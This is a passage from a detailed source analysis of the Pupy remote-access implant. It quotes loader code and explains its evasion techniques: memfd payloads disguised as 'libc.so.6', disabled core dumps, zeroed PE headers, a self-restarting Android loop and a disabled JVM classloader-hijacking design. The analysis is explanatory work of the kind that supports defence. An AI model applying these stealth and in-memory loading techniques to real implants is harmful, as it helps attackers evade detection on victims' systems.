    PPVOID ppvFunctionAddress;
} ImportFunc;

typedef struct {
    DWORD dwModuleHash;
    DWORD dwCount;
    ImportFunc *funcs;
} ImportFrom;
```
`[source: ReflectiveLoader.c:43-52]`

`ImportFrom` = a module identified by `dwModuleHash` with an array of `ImportFunc` entries, each a **function hash → address** pair. So the reflective loader resolves `LoadLibraryA`, `GetProcAddress`, `VirtualAlloc`, `VirtualProtect`, `VirtualFree` (declared at `:59-63`) by **walking the kernel32 export table and hashing names**, with the strings never appearing in the loader's own data section. `[source: ReflectiveLoader.c:43-52, :59-63]`

This is a **third distinct resolution strategy in one repository**:

| Strategy | Where | Mechanism |
|---|---|---|
| By name, via `MyFindProcAddress` | `pupy.c:317` | C string name lookup |
| By hash, walking exports | `ReflectiveLoader.c:43-52` | `dwModuleHash`/`dwFunctionHash` |
| By name, via `GetProcAddressR` | `GetProcAddressR.c` | reflective-safe name walk |

`[sources: pupy.c:317; ReflectiveLoader.c:43-52; measured GetProcAddressR.c:5,608 B]`

`RtlAddFunctionTable` is declared **only under `_WIN64`** (`:65-67`) — the SEH/unwind table registration the 64-bit loader needs. `NtFlushInstructionCache` is present but **commented out** (`:68`), so the loader does **not** explicitly flush the instruction cache after writing code. `[source: ReflectiveLoader.c:65-68]`

### 14.4 `sources-linux-py3/pupy_load.c` — the Linux mirror (126 lines, 3,048 B)

The Linux entry point is a **line-for-line structural mirror of the Windows one**, which confirms the loader→agent ABI is platform-independent:

```c
// sources-linux-py3/pupy_load.c:23-29
#include "Python-dynload.c"
#include "revision.h"
#include "ld_hooks.h"
#include "memfd.h"

// include the c extension to load from memory
#include "_pupy.c"
```
`[source: client/sources-linux-py3/pupy_load.c:23-29]`

**The same `Python-dynload.c` is `#include`d here as on Windows** (§1.5) — the CPython embedding core is shared verbatim across platforms; only the OS glue differs. `[source: sources-linux-py3/pupy_load.c:23; §1.5]`

```c
// sources-linux-py3/pupy_load.c:90-112
void *c_pupy = xz_dynload(
    "_pupy.so",
    _pupy_c_start, _pupy_c_size,
    NULL
);
PyObject *(*PyInit__pupy)(void);
PyInit__pupy= dlsym(c_pupy, "PyInit__pupy");
if (!PyInit__pupy) {
    dprint("Couldn't find sym PyInit__pupy");
    dlclose(c_pupy);
    return -1;
}

oldcontext = _Py_PackageContext;
_Py_PackageContext = "_pupy";

PyObject *m = PyInit__pupy();
_Py_PackageContext = oldcontext;

PyObject *modules = NULL;
modules = PyImport_GetModuleDict();
PyObject *name = PyUnicode_FromString("_pupy");
_PyImport_FixupExtensionObject(m, name, name, modules);
```
`[source: sources-linux-py3/pupy_load.c:90-112]`

**Identical sequence to Windows** (§1.8): `xz_dynload("_pupy.so", ...)` → `dlsym` for `PyInit__pupy` → save `_Py_PackageContext`, set it to `"_pupy"`, call the init function, restore → `_PyImport_FixupExtensionObject` to install into `sys.modules`. The only difference is `dlsym` instead of `MyGetProcAddress`, and `.so` instead of `.pyd`. `[source: sources-linux-py3/pupy_load.c:90-112; §1.8]`

Two Linux-specific hardening behaviours are absent on Windows:

```c
// sources-linux-py3/pupy_load.c:46-54
if (getrlimit(RLIMIT_NOFILE, &lim) == 0)
{
    lim.rlim_cur = lim.rlim_max;
    setrlimit(RLIMIT_NOFILE, &lim);
}

lim.rlim_cur = 0;
lim.rlim_max = 0;
setrlimit(RLIMIT_CORE, &lim);
```
`[source: sources-linux-py3/pupy_load.c:46-54]`

1. **`RLIMIT_NOFILE` raised to the hard maximum** — the implant anticipates opening many sockets/file descriptors. `[source: pupy_load.c:46-50]`
2. **`RLIMIT_CORE` set to 0/0 — core dumps disabled** (`:52-54`). This prevents the OS from writing a core file containing the decrypted payload to disk on a crash. It is the Linux equivalent of the Windows `SetErrorMode`/`OnAbortHandler` crash suppression at `pupy_load.c:323-336` (§1.6). `[source: sources-linux-py3/pupy_load.c:52-54; §1.6]`

The `_FEATURE_PATHMAP` block (`:56-80`) dynloads a separate `ld_hooks` object and installs a `set_pathmap_callback` hook via `dlsym` — a **path-mapping indirection layer** that lets the payload remap filesystem paths it will appear to have loaded from. `[source: sources-linux-py3/pupy_load.c:56-80; ld_hooks.h]`

### 14.5 `memfd.h` — anonymous executable memory on Linux (90 lines, 1,880 B)

The Linux equivalent of MemoryModule: get a **file descriptor backed by anonymous memory**, with no filesystem path, then `fexecve`/`dlopen` it via `/proc/<pid>/fd/<n>`.

```c
// memfd.h:17-25
#ifndef __NR_memfd_create
 #ifdef __x86_64__
  #define __NR_memfd_create 319
 #elif __i386__
  #define __NR_memfd_create 356
 #elif __arm__
  #define __NR_memfd_create 385
 #endif
#endif
```
`[source: client/sources-linux-py3/memfd.h:17-25]`

**Three hardcoded syscall numbers** — `memfd_create` is not in older glibc `sys/syscall.h`, so the author inlined the numbers: **319 (x86_64)**, **356 (i386)**, **385 (arm)**. Note there is **no `__aarch64__` branch**, so on 64-bit ARM the `#define` is absent and the call compiles against a possibly-undefined symbol. That is a real gap for ARM64 Linux. `[source: memfd.h:17-25]`

```c
// memfd.h:56-78
#ifdef Linux

#ifdef DEBUG
    #define _path path
#else
    char _path[PATH_MAX] = "libc.so.6";
#endif
    /* Do not make syscall billion times */
    if (memfd_checked && !memfd_works) {
      errno = ENOSYS;
      return -1;
    }

    int fd = syscall(__NR_memfd_create, _path, MFD_CLOEXEC | MFD_ALLOW_SEALING);

    if (fd == -1) {
      if (errno == ENOSYS)
        memfd_works = false;

      return -1;
    }

    snprintf(path, path_size, MEMFD_FILE_PATH "%d", getpid(), fd);
    return fd;
```
`[source: memfd.h:56-78]`

**`char _path[PATH_MAX] = "libc.so.6";` (`:61`) is the camouflage.** In release builds the memfd is *named* `"libc.so.6"` — so `/proc/<pid>/fd/<n>` resolves to a symlink reading `.../memfd:libc.so.6 (deleted)`, indistinguishable at a glance from a mapped system library. Under `#ifdef DEBUG` the real path is used instead. This is deliberate masquerading in the process's own fd table. `[source: memfd.h:56-62]`

`MFD_CLOEXEC | MFD_ALLOW_SEALING` (`:69`) — close-on-exec so the fd does not leak into children, and sealing so the payload pages can be made immutable after writing. `[source: memfd.h:69]`

The result is returned as a path string built from `/proc/<pid>/fd/<fd>` (`:78`), with `PROCFS_PATH "/proc/"` and `MEMFD_FILE_PATH PROCFS_PATH "%d/fd/"` at `:35-36`. A negative result is cached (`memfd_works = false`, `:73`) so an unsupported kernel is probed **once**, not per call — the comment `/* Do not make syscall billion times */` at `:63` states the intent. `[source: memfd.h:35-36, :63-76]`

```c
// memfd.h:85-89
inline static bool is_memfd_path(const char *path)
{
    return !strncmp(path, PROCFS_PATH, strlen(PROCFS_PATH)) && \
        strstr(path, "/fd/");
}
```
`[source: memfd.h:85-89]` — a helper for the loader to recognise its own `/proc/*/fd/*` paths, which is the counterpart to the `_FEATURE_PATHMAP` hook at `pupy_load.c:56-80`. `[source: memfd.h:85-89; pupy_load.c:56-80]`

### 14.6 Android — `main.py` / `pp.py` (642 B / 138 B)

```python
# android_sources/main.py:1-24
import os
import platform
import time

os.environ['KIVY_NO_FILELOG'] = 'yes'
platform.system = lambda: 'android'

if __name__ == '__main__':
    import sys
    setattr(sys, 'executable', 'PythonService')

    import pp

    while True:
        try:
            pp.main()
        except Exception as e:
            import traceback
            traceback.print_exc()
            time.sleep(10)
```
`[source: client/android_sources/main.py:1-24]`

Three deliberate falsifications, all **runtime monkey-patches rather than build configuration**:

1. `os.environ['KIVY_NO_FILELOG'] = 'yes'` (`:8`) — suppresses Kivy's log file, so the payload leaves no application log on disk.
2. `platform.system = lambda: 'android'` (`:9`) — **replaces the `platform.system` function itself**. Any code, ours or a dependency's, that asks the OS name gets `'android'`.
3. `setattr(sys, 'executable', 'PythonService')` (`:15`) — rewrites `sys.executable` to the string `'PythonService'`. **This matters directly**: `pupy.c`'s `mexec` and the persistence scriptlet both fall back to `sys.executable` when no source is given (`scriptlets/persistence.py:45-46`, `src = sys.executable`). On Android that would yield the literal `'PythonService'`. `[source: android_sources/main.py:15; scriptlets/persistence.py:45-46]`

The `while True:` loop with `except Exception` + `traceback.print_exc()` + `time.sleep(10)` (`:17-24`) is a **crash-restart supervisor**: the payload relaunches itself every 10 s forever. There is no exit path and no backoff growth. `[source: android_sources/main.py:17-24]`

The `#include "jni_on_load.c"` relationship (§1.9) means this Python file and the JNI shim are two halves of one bootstrap — the JNI thread starts the CPython runtime, and `main.py` is what CPython then executes. `[source: main_reflective.c:12; §1.9]`

### 14.7 pyoxidizer — the second build path (`pyoxidizer.bzl`, 14,837 B)

The Rust-based build path, confirmed by its policy calls:

```python
# pyoxidizer-build/pyoxidizer.bzl:13, :19, :23, :28, :34, :67, :71
dist = default_python_distribution()
policy = dist.make_python_packaging_policy()
policy.allow_files = True
policy.allow_in_memory_shared_library_loading = True
policy.bytecode_optimize_level_two = True
policy.include_distribution_sources = True
policy.include_distribution_resources = False
```
`[source: client/pyoxidizer-build/pyoxidizer.bzl:13, :19, :23, :28, :34, :67, :71]`

- **`allow_in_memory_shared_library_loading = True`** (`:28`) — the PyOxidizer-specific enabler for loading extension modules from memory rather than disk. This is the feature the whole in-memory design depends on, and the reason pyoxidizer is a viable build path at all. `[source: pyoxidizer.bzl:28]`
- **`include_distribution_sources = True`** (`:67`) — the **Python standard library sources are embedded**, which is what makes the `python310.dll` external dependency (§1.4) unnecessary on this path. The stdlib comes from inside the binary. `[source: pyoxidizer.bzl:67; §1.4]`
- **`include_distribution_resources = False`** (`:71`) — non-source resources (`.dist-info`, data files) are excluded, reducing size. `[source: pyoxidizer.bzl:71]`
- `bytecode_optimize_level_two = True` (`:34`) — **`-OO`**, which strips docstrings *and* turns `assert` statements into no-ops. That last part is consequential: §4.5 noted `dns_encoder.py:277`'s `assert(found)` in the Huffman decoder. Under a `-OO` PyOxidizer build, **that assertion disappears entirely**, converting a decoder-integrity check into silent corruption. `[source: pyoxidizer.bzl:34; §4.5]`
- Lines `:32-33` (`bytecode_optimize_level_zero`/`_one`) are **commented out**, leaving only level two active. `[source: pyoxidizer.bzl:32-34]`

Note the asymmetry: the three policy flags that most affect runtime behaviour (`:23`, `:28`, `:34`) are uncommented and active, while around fifteen neighbouring options (`:37-73`) are commented-out documentation. Only the ones the author tested are live. `[source: pyoxidizer.bzl:19-73]`

This path is why `agent/__init__.py:1037` tests `if "rustc" not in sys.version:` — a PyOxidizer build reports the Rust compiler in `sys.version`, and the `dl_hacks` module is skipped there because PyOxidizer already handles dynamic loading. `[source: agent/__init__.py:1037; §6.6]`

### 14.8 U-4 — what remains, stated honestly

**Files read for this section:** `pupy.c` (Windows) in the depth shown, `base_inject.c:516-603`, `ReflectiveLoader.c:30-97`, `sources-linux-py3/pupy_load.c` (all 126 lines), `memfd.h` (all 90 lines), `android_sources/main.py` (all 24 lines), `pyoxidizer.bzl` policy region.

**Still not read line-by-line, and therefore not asserted.** This list was **re-verified against the measured tree** during the task-14 acceptance re-read, and three omissions in the first version are corrected here (see the note below the table). `sources-windows-py3/` contains **33 files**, of which the following sources were **not opened**:

| File | Size | Significance |
|---|---|---|
| `MemoryModule.c` | 51,876 B | largest native file; export surface mapped §14.9, bodies not |
| `MyLoadLibrary.c` | 27,034 B | the `MyLoadLibrary` family backing `pupy.c:307`; bodies not |
| `postmortem.c` | 25,642 B | crash/exit behaviour; **not opened at all** |
| `jni_on_load.c` | 30,294 B | Android JNI bootstrap; only the `#include` (from `main_reflective.c:12`) and a `setup_jvm_class` stub established — §1.9 |
| `thread.c` | 13,168 B | thread plumbing |
| `LoadLibraryR.c` | 12,704 B | the "R" reflective load variant |
| `in-mem-exe.c` | 11,055 B | in-memory EXE (vs DLL) execution |
| `GetProcAddressR.c` | 5,608 B | third resolution strategy (by name, reflection-safe) |
| `remote_thread.c` | 5,413 B | remote-thread primitive |
| `actctx.c` | **732 B** | **omitted from the first version of this list** |
| `resource_python_manifest.c` | **1,508 B** | **omitted from the first version** — embeds a Python manifest resource |
| `main_exe.c` (Windows) | **803 B** | **omitted from the first version** — see the correction note |

`sources-linux-py3/`: `tmplibrary.c` (20,501 B), `ld_hooks.c` (7,286 B), `daemonize.c` (10,846 B), `pupy.c` (15,391 B — the Linux `_pupy` variant), `decompress.c`, `main_so.c`, `main_exe.c` (Linux), `pupy.so.ldscript`, `memfd.c` if present. `android_sources/`: `jni_on_load.c` (distinct from the Windows-side file), plus the JNI/system-exit sources. `[source: measured client/ tree]`

**Correction made during the task-14 acceptance re-read** — the Lead asked that this list be re-checked against reality rather than left stale, and it was:

1. **`main_exe.c` exists in `sources-windows-py3/` (803 B).** The first version of this list attributed `main_exe.c` to the **Linux** tree only. Both trees have one. This is not cosmetic: §1.11/Bootstrap documented the Windows `initialize(FALSE) → execute(NULL) → deinitialize()` path as arriving via the reflective/`main_reflective.c` route, and `main_exe.c` is the **separate executable** entry point that was already the subject of §1.10-§1.11. Its presence in the measured tree is consistent with §1 — noted so the reader does not infer a missing file. `[source: measured sources-windows-py3/main_exe.c: 803 B; §1.10-§1.11]`
2. **`actctx.c` (732 B) and `resource_python_manifest.c` (1,508 B) were simply absent from the first list.** Both are small but non-trivial: `actctx` implies an **assembly-context manifest** (side-by-side DLL versioning — relevant to which CRT/COM pieces the payload binds), and `resource_python_manifest.c` embeds a **manifest resource**, which is the mechanism by which the Windows loader is told what it may bind. Neither is read; both are now recorded rather than silently missing. `[source: measured 732 B / 1,508 B]`

The original list also named `tmplibrary.c` (20,501 B), `ld_hooks.c` (7,286 B), `daemonize.c` (10,846 B) and `pupy.c` (Linux, 15,391 B) **without locating them in a tree** — they are `sources-linux-py3/` files, now stated as such. `[source: measured client/ tree]`

All of this is recorded as **U-4a** in §15. `[source: measured sources-windows-py3/ = 33 files]`

### 14.9 `MemoryModule.c` — export surface mapped (51,876 B, largest native file)

Not read line-by-line, but the export inventory is measured and reveals the capability set:

```
:41  _MemorySearchResourceEntry      — walk PE resource directory
:46  _MemorySizeofResource
:47  _MemoryLoadResource
:48  _MemoryLoadString
:49  _MemoryLoadStringEx             — load resources from an in-memory image
:54  (unnamed static, void*)
:61  RtlGetVersion                   — reimplemented ntdll call
:138, :153 (static helpers)
:205 ProtectionFlags[2][2][2]        — the standard section-permission table
:217-:519 (static BOOL helpers, incl. RegisterExceptionTable at :699)
:738 fnv1a                          — FNV-1a hash (export table building)
:749 isAllowedSymbol                 — export filtering
:814 BuildExportTable
:884 SizeOfPEHeader
:891 CleanupHeaders                  — zero the PE headers post-map
:906 _CreateModuleMapping            — map from an existing HMODULE
:1278 MemoryModuleFileNameA
:1294 MemoryModuleFileNameW
:1310 MemoryFreeLibrary
```
`[source: client/sources-windows-py3/MemoryModule.c:41, :46-49, :54, :61, :205, :699, :738, :749, :814, :884, :891, :906, :1278, :1294, :1310]`

Four capabilities stand out even from the export list alone:

1. **`fnv1a` (`:738`) + `BuildExportTable` (`:814`) + `isAllowedSymbol` (`:749`)** — this MemoryModule variant resolves **imports by FNV-1a hash** and **filters which exports are visible**, which is the `MEMORY_LOAD_EXPORT_FILTER_PREFIX` flag used at `pupy_load.c:253-280` (§1). So the loader can present a DLL whose export table is *deliberately truncated*. `[source: MemoryModule.c:738, :749, :814; §1]`
2. **`CleanupHeaders` (`:891`)** — the PE headers are zeroed after mapping, so a memory scan for `MZ`/`PE\0\0` at the module base finds nothing. This is the standard in-memory-PE anti-forensic step and it is implemented here, not in the caller. `[source: MemoryModule.c:891]`
3. **`_MemoryLoadResource`/`_MemoryLoadString` (`:47-49`) + `RegisterExceptionTable` (`:699`)** — full resource loading and SEH/unwind registration from memory, so a mapped module behaves like a normally-loaded one (dialogs, string tables, exception unwinding). `[source: MemoryModule.c:41-49, :699]`
4. **`_CreateModuleMapping` (`:906`) + `MemoryModuleFileNameA/W` (`:1278`, `:1294`)** — a module can be created *mapped from an existing HMODULE* (the `MEMORY_LOAD_FROM_HMODULE` flag at `pupy_load.c:253-280`) and reports a plausible filename. That is exactly the mechanism behind the private `NTDLL.DLL`/`KERNEL32.DLL` aliasing in §1. `[source: MemoryModule.c:906, :1278, :1294; §1]`

The `ProtectionFlags[2][2][2]` table at `:205` is the canonical MemoryModule construct mapping (readable, writable, executable) triples to page protections — standard, and its presence confirms this is the well-known open-source MemoryModule rather than a bespoke loader. `[source: MemoryModule.c:205]`

## 15. Revised residual unknowns

**Closed by this append:**

- **U-1 (picocmd wire format) — CLOSED.** §13. The framing is `[CRC32 4B BE][cmd_id 1B][payload]` **repeating**; the CRC is **unkeyed** and ignores its `nonce` parameter; the dispatch table is 29 positional IDs with the V2 boundary at **23**; the V1/V2 branch is a version byte at `picocmd.py:1353` where **only V1 is implemented**. T6's claim is verified and was under-specified in one respect (the repeating structure). `[source: §13]`
- **U-4 (remaining client/ C) — PARTIALLY CLOSED.** §14. `pupy.c` (the `_pupy` extension, 9 methods), `base_inject.c` injection chain, `ReflectiveLoader.c` hash resolution, Linux `pupy_load.c`, `memfd.h`, Android `main.py`, pyoxidizer policy, and the `MemoryModule.c` export surface are all now documented. The largest file bodies remain, listed as U-4a.

**Newly opened:**

**U-4a — `MemoryModule.c` internals.** 51,876 B, the largest native file in the corpus. Export surface mapped (§14.9) but the section-mapping, relocation, FNV-1a export-table construction, `CleanupHeaders`, and `RegisterExceptionTable` bodies are unread. This is the single biggest remaining native gap. `[source: §14.9]`

**U-4b — `jni_on_load.c` (30,294 B).** Only the `#include` relationship from `main_reflective.c:12` and the existence of a `setup_jvm_class` stub are established (§1.9). The JNI bootstrap — `JNI_OnLoad`, class/method registration, the CPython-thread creation from a Java thread — is unread. Android bootstrap is therefore still only half-mapped. `[source: §1.9]`

**U-4c — `postmortem.c` (25,642 B).** Not read at all, not even the export list. The name implies crash-reporting/cleanup behaviour, which would matter for any uptime or forensic analysis. `[source: measured client/sources-windows-py3/postmortem.c: 25,642 B]`

**U-8 — `_pupy_pyd_args_t` layout.** `pupy.c:506-507` casts `lpReserved` to `_pupy_pyd_args_t*` and reads `pvMemoryLibraries`, then writes `cbExit` and `blInitialized`. The struct definition is in a header not yet located; the field order, types, and version stability are unread. This is the **exact contract between `pupy_load.c` and `_pupy.pyd`** and would matter for any ABI-level reimplementation. `[source: pupy.c:505-515]`

**U-9 — the `NonInheritable`/`hidden` stdio semantics of `mexec`.** `pupy.c:96` sets `CREATE_NEW_CONSOLE` unconditionally, and `hidden` only adds `STARTF_USESHOWWINDOW` (`:138-139`). Whether a `CREATE_NEW_CONSOLE` process is actually hidden by `STARTF_USESHOWWINDOW` (versus requiring `CREATE_NO_WINDOW`) is not resolvable from source alone — it depends on Windows behaviour. Flagged as an observed-code fact, not asserted as a defect. `[source: pupy.c:96, :138-139]`

**Carried forward, unchanged:** U-2 (transport swap — verified negative, brine control channel is the mechanism), U-3 (retrained Huffman tables), U-5 (`security.py` capability set, 78,800 B), U-6 (`ecm.py` vs `ec4.py`), U-7 (`rsa_aes.py`). `[source: §10]`

---

## 16. Corrections to earlier sections

Three corrections to my own work in this append:

1. **§4.8 implied `_unpack_v1` was a legacy fallback.** At `picocmd.py:1353-1357` it is the **only implemented branch**, and `version == 2` raises `NotImplementedError` explicitly. §13.4 states this correctly. `[source: picocmd.py:1351-1357; §13.4]`
2. **§4/§10 treated the picocmd framing as flat.** It is a **repeating sequence** — one CRC over all commands, then `[cmd_id][payload]` pairs to end-of-buffer. §13.1 corrects the shape. `[source: picocmd.py:1792-1794, :1818-1823]`
3. **§4/§9 located `picocmd.py` implicitly by its containing package.** The task text placed it at `packages/all/`; it is at `network/lib/picocmd/`. §13.0 records the path along with the two prior instances of this same error class. `[source: §13.0]`

---

## 17. Addendum to §11 — persistence as a headline finding

Restated at the top level, because it is the single most consequential corpus-level finding in this lane and §11.1 buried it in a comparison:

> **Pupy's Windows persistence is fully configured, fully wired, and cannot work.**
>
> Present: the config (`pupy.conf.default:178-181`, `name = OneDriveUpdate`, `preferred_methods = 2,8,3,9`), the CLI module (`modules/persistence.py`, `__class_name__ = "Persistence"` at `:31`), the scriptlet (`scriptlets/persistence.py`, 67 lines, computing an MD5-derived install path at `:39-46` and a registry key at `:49`), and both config keys it reads (`:103`, `:136`).
>
> Absent: `pupwinutils/persistence.py` — the module that defines `add_registry_startup`, imported at `scriptlets/persistence.py:29` and called at `:66`.
>
> **`pupwinutils.persistence` is the only unresolved `pupwinutils.*` reference in the tree.** Every other module in that namespace resolves. Therefore the absence is a property of upstream, not of this analysis copy.
>
> Net effect: `scriptlets/persistence.py` raises `ImportError` at load time on Windows. The feature cannot be invoked at all. Linux persistence **is** implemented (`packages/linux/all/persistence.py`, 13,088 B). Removal is unimplemented on both (`# TODO persistence removal`, `modules/persistence.py:73`).
>
> This is a **shipped-broken feature**, not a missing one: the operator-facing surface advertises persistence, the default config names a masquerading binary (`OneDriveUpdate`), and the implementation was never committed. `[sources: §11.1, §13.7; pupy.conf.default:178-181; modules/persistence.py:31, :73, :103, :136; scriptlets/persistence.py:9, :29, :66]`

---

## 18. U-4b closed — `jni_on_load.c`, and a second shipped-broken feature

**Path:** `pupy/client/common/jni_on_load.c` — **30,294 B / 1,012 lines.** Note it is in `client/common/`, **not** in `sources-windows-py3/` as §14.8's original list implied. It is shared: `sources-windows-py3/main_reflective.c:12` and `sources-linux-py3/main_so.c:14` both `#include "jni_on_load.c"`. `[source: client/common/jni_on_load.c; main_reflective.c:12; sources-linux-py3/main_so.c:14]`

### 18.1 The headline — the JVM Python module is COMMENTED OUT

**This is not a bootstrap stub. It is a complete JVM introspection subsystem that was disabled and abandoned.**

The module's entire Python surface is declared, documented, and then **commented out**:

```c
// jni_on_load.c:870-898
static PyMethodDef JVM_Methods[] = {
    { "get_jvm", Py_get_JVM, METH_NOARGS, DOC("Get pointer to JVM") },
    { "find_class", Py_find_class, METH_VARARGS, DOC("Call hinted FindClass") },
    { "get_preferred_classloader", Py_get_PreferredClassLoader,
      METH_VARARGS, DOC("Get pointer to initializer thread's ClassLoader") },
    { "set_preferred_classloader_name", Py_set_preferred_classloader_name,
      METH_VARARGS, DOC("Class name of required default classloader") },
    { "get_preferred_classloader_name", Py_get_preferred_classloader_name, METH_NOARGS,
      DOC("Get current class name of requried default classloader") },
    { "set_preferred_loadable_class", Py_set_preferred_loadable_class,
      METH_VARARGS, DOC("Class name of class which required classloader should be able to load") },
    { "get_preferred_loadable_class", Py_get_preferred_loadable_class, METH_NOARGS,
      DOC("Get current class name of class which required classloader should be able to load") },
    { "enumerate_threads_classloaders", Py_enumerate_threads_classloaders,
      METH_NOARGS, DOC("Get dict of thread names and names of their classloaders") },
    { "apply_preferred_classloader", Py_set_ClassLoader, METH_NOARGS,
      DOC("initializer thread's ClassLoader to current thread") },
    { NULL, NULL },		/* Sentinel */
};
/*
static struct PyModuleDef JvmModuleDef =
{
    PyModuleDef_HEAD_INIT,
    "jvm", 
    jvm_module_doc, 
    -1,   
    JVM_Methods
};
*/
void setup_jvm_class(void) {
    /*PyObject *jvm_klass = PyModule_Create(&JvmModuleDef);
    if (!jvm_klass) {
        return NULL;
    }

    jvm_error = PyErr_NewException("jvm.error", NULL, NULL);
    Py_INCREF(jvm_error);
    PyModule_AddObject(jvm_klass, "error", jvm_error);
    */
    dprint("NOT IMPLEMENTED: broken jvm setup\n");
    return NULL;
}
```
`[source: client/common/jni_on_load.c:870-911]`

**`setup_jvm_class` is the only entry point, and it is a corpse with a tombstone.** The `PyModuleDef` is inside a `/* ... */` block (`:889-898`); the `PyModule_Create` body is inside another `/* ... */` inside the function (`:900-908`); the surviving statement is `dprint("NOT IMPLEMENTED: broken jvm setup\n")` followed by `return NULL` (`:909-910`). **All nine `JVM_Methods` are dead code** — they are registered in the table but that table is never passed to `PyModule_Create`, because the only call site of `PyModule_Create` is commented out. `[source: jni_on_load.c:870-911]`

### 18.2 Dead at three independent levels — the proof chain

This is not a single disabled line. The feature is severed at **three separate points**, any one of which alone would be fatal:

| # | Level | Evidence |
|---|---|---|
| 1 | **The implementation** | `jni_on_load.c:899-911` — `setup_jvm_class()` is gutted, prints `"NOT IMPLEMENTED: broken jvm setup"`, returns NULL |
| 2 | **The call site (Windows)** | `client/common/Python-dynload.c:326` — `//setup_jvm_class();` |
| 3 | **The call site (Linux)** | `sources-linux-py3/pupy.c:539` — `//setup_jvm_class();` |
| 4 | **The stub definitions** | `sources-windows-py3/main_exe.c:41` and `sources-linux-py3/main_exe.c:22` — both define `void setup_jvm_class(void) {}` (empty) |

`[sources: jni_on_load.c:899-911; Python-dynload.c:326; sources-linux-py3/pupy.c:539; sources-windows-py3/main_exe.c:41; sources-linux-py3/main_exe.c:22]`

Both `main_exe.c` files provide an **empty definition** of the same symbol, so even if a call site were uncommented, the linker would bind to the empty stub and silently do nothing. The declaration survives in both `pupy_load.h` files (`sources-windows-py3/pupy_load.h:24`, `sources-linux-py3/pupy_load.h:13`), so the symbol is still part of the build contract — it was removed from the *behaviour* without being removed from the *interface*. `[source: as cited]`

**Consequence:** there is no `jvm` module at runtime. Any Python code doing `import jvm` fails. Any capability advertised by those nine method docstrings — classloader enumeration, `FindClass` against an arbitrary classloader, applying a preferred classloader to the current thread — **does not exist in any shipped payload**. `[source: jni_on_load.c:870-911]`

### 18.3 What the disabled code *would* have done — the capability that was abandoned

Even disabled, the source records the intended design, and it is the most sophisticated Android capability in the corpus.

**The classloader problem.** On Android/ART, `FindClass` resolves against the *calling thread's* classloader. A native library loaded by the system classloader therefore **cannot see application classes** (`com.example.app.*`). The standard fix is to borrow the classloader from a thread that *can* see them. This file is a complete implementation of that, and the four globals state the design:

```c
// jni_on_load.c:6-16
static JavaVM *__jvm = NULL;

static jobject __j_initial_classloader = NULL;
static jobject __j_preferred_classloader = NULL;
static jclass __j_ClassLoader = NULL;
static jmethodID __j_ClassLoader_findClass = NULL;

static PyObject * jvm_error = NULL;
static char *__preferred_classloader_name = NULL;
static char *__preferred_loadable_class = NULL;
static char jvm_module_doc[] = "Info about parent JVM";
```
`[source: client/common/jni_on_load.c:6-16]`

- `__j_initial_classloader` — captured from the **initialiser thread** (the one that called `JNI_OnLoad`, which is the app's own UI/main thread and therefore *can* see app classes).
- `__j_preferred_classloader` / `__preferred_classloader_name` — an operator-selectable override: name a specific classloader and the code hunts for it.
- `__preferred_loadable_class` — a **capability probe**: name a class the chosen classloader must be able to load, and the search uses that as its success test.
- `__j_ClassLoader_findClass` — a cached `jmethodID` for `ClassLoader.findClass`, the method used to resolve **outside** the normal delegation chain.

`[source: jni_on_load.c:6-16, :870-886]`

**The thread walk.** `jvm_for_each_thread` (`:153`) enumerates **every thread in the JVM** via `Thread`-class reflection, applying a callback per thread. `__thread_class_loader_name_and_class` (`:246`) extracts each thread's classloader name, and `__thread_name_and_classloader_to_dict` (`:566`) and `Py_new__thread_name_and_classloader_to_dict_ctx` (`:65`) marshal the result into a **Python dict of thread name → classloader name**. `[source: jni_on_load.c:65, :153, :246, :566]`

**The finder.** `__find_preferred_classloader_finder` (`:306`) is the per-thread callback that tests whether a candidate thread's classloader can load `__preferred_loadable_class`; `__find_preferred_classloader` (`:374`) drives the search to a winner. `[source: jni_on_load.c:306, :374]`

**The override.** `__multi_FindClass` (`:783`) is the payload — a drop-in `FindClass` that resolves against the **preferred** classloader rather than the caller's. This is the actual in-JVM payload-loading primitive: it would let the implant load attacker-supplied Java classes into an arbitrary app context. `[source: jni_on_load.c:783]`

**Helper layer:** `call_method` (`:452`), `call_class_method` (`:498`), `call_instance_method` (`:517`) — typed JNI reflection wrappers; `Py_JString_to_PyString` (`:546`) — `jstring`→Python conversion; `get_thread_class` (`:436`) — caches `java.lang.Thread`. `[source: jni_on_load.c:436, :452, :498, :517, :546]`

**This is why `find_class`'s docstring says "Call hinted FindClass"** (`:872`) — "hinted" because the classloader is chosen by operator hint rather than by the calling thread. That one word is the whole design compressed. `[source: jni_on_load.c:872]`

### 18.4 What part of `jni_on_load.c` is actually LIVE

`JNI_OnLoad` (`:923-1012`) is **not** commented out — it is the real exported entry point, invoked by `dlopen` when the library is loaded into a JVM:

```c
// jni_on_load.c:923-954
JNIEXPORT jint JNICALL
JNI_OnLoad(JavaVM *vm, void *reserved) {
    jclass Thread;
    jobject classLoader;
    JNIEnv* env;
    jobject currentThread;
    jint ret;
    JavaVMAttachArgs args;

    if (!vm) {
        return 0;
    }

    dprint("JVM provided: %p\n", vm);

    __jvm = vm;

    ret = (*vm)->GetEnv(vm, &env,  JNI_VERSION_1_6);
    if (ret != JNI_OK) {
        if (ret == JNI_EDETACHED) {
            dprint("JVM Attach required\n");
            ret = (*vm)->AttachCurrentThread(vm, &env, (void *)&args);
            if (ret == JNI_OK) {
                dprint("Attached to JVM: %s ver %08x\n", args.name, args.version);
            }
        }

        if (ret != JNI_OK) {
            dprint("Failed to get JNIEnv: %d\n", ret);
            return JNI_ERR;
        }
    }

    Thread = get_thread_class(env);
    if (Thread == NULL) {
        return JNI_ERR;
    }

    ret = call_class_method(
        env, Thread, "currentThread", "()Ljava/lang/Thread;",
```
`[source: client/common/jni_on_load.c:923-962]`

So the boundary is precise: **`JNI_OnLoad` runs** (it caches `__jvm`, obtains/attaches a `JNIEnv`, resolves `java.lang.Thread`, captures the current thread). **`setup_jvm_class` does not**, so none of it is reachable from Python. The subsystem caches state, then that state is never exposed. `[source: jni_on_load.c:923-962, :899-911]`

Two mechanisms worth naming:

- **`JNI_VERSION_1_6` (`:940`)** — the requested JNI version. On Android `JNI_VERSION_1_6` is the standard modern value. `[source: jni_on_load.c:940]`
